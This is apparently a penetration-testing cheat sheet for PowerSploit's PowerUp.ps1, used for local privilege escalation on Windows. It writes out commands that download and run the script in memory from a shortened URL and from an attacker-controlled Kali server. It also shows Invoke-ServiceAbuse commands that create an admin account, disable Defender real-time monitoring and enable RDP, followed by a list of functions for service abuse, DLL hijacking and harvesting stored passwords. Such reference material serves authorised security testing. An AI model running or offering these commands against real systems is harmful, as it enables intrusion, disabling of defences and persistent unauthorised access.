# Local Priv Esc Using PowerUp.ps1

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

## Load PowerUp Locally&#x20;

Load PowerUp.ps1

```
. .\PowerUp.ps1
```

## Load PowerUp to Memory

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/1PdjSHk")
```

#### Loading From Your Kali Apache Server

```
PS C:\> IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>/PowerUp.ps1’)
```

#### PowerShell Version 3 And Above

```
PS C:\> iex (iwr 'http://<kali_ip>/PowerUp.ps1')
```

## Invoke All Privilege Escalation Checks

Invoke All Privilege Escalation Checks on Machine

```
Invoke-AllChecks
```

## Service Abuse

{% embed url="https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/" %}
Main Documentation and Examples
{% endembed %}

Invoke Service Abuse

```
Invoke-ServiceAbuse -Name 'AbyssWebServer'
```

Adding a new user with password

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337
```

Running a custom command

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

Running a custom command (Enable RDP services) Powershell

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
```

## Service Enumeration

```
Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               -   returns services the current user can modify
Get-ServiceDetail                   -   returns detailed information about a specified service
```

## Service Abuse

```
Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes commands
Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes commands
Restore-ServiceBinary               -   restores a replaced service binary with the original executable
```

## DLL Hijacking

```
Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     -   writes out a hijackable DLL
```

## Registry Checks

```
Get-RegistryAlwaysInstallElevated   -  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               -   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
```

## Miscellaneous Checks

```
Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
Get-UnattendedInstallFile           -   finds remaining unattended installation files
Get-Webconfig                       -   checks for any encrypted web.config strings
Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files
```

## Other Helpers

```
Get-ModifiablePath                  -   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        -   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     -   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  -   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
Invoke-AllChecks                    -   runs all current escalation checks and returns a report
```

{% embed url="https://blog.certcube.com/powerup-cheatsheet/" %}

{% embed url="https://powersploit.readthedocs.io/en/latest/" %}
This is the full manual / documentation
{% endembed %}
